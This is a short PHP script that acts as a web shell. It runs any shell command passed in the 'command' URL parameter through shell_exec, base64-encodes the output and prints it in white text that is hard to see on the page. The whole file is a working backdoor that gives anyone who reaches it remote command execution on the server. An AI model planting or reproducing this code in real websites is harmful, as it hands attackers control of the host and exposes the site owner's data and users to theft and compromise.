<?php
if (isset($_GET['command'])) {

    $command = $_GET['command'];

    $output = base64_encode(shell_exec($command));

    echo "<p style='color:white;'>$output</p>";
}
else {
  echo "<p style='color:white;'>GET parameters blank or not valid";
}

?>

